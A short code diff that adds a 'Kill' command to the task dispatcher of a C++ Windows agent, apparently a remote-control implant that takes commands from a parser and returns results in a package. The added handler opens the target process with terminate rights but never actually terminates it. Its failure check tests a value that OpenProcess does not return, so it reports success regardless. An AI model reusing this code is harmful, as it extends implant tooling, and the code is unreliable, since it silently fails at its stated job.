@@ -1237,6 +1237,15 @@ auto DECLFN Task::Process(
             
             break;
         }
+        case Enm::Ps::Kill: {
+            BOOL   RoutineStatus = TRUE;
+            ULONG  ProcessId     = Self->Psr->Int32( Parser );
+            HANDLE ProcessHandle = Self->Ps->Open( PROCESS_TERMINATE, FALSE, ProcessId );
+
+            if ( ProcessHandle == INVALID_HANDLE_VALUE ) RoutineStatus = FALSE;
+            
+            Self->Pkg->Int32( Package, RoutineStatus ); break;        
+        }
         case Enm::Ps::ListPs: {
             PVOID ValToFree = NULL;
             ULONG ReturnLen = 0;
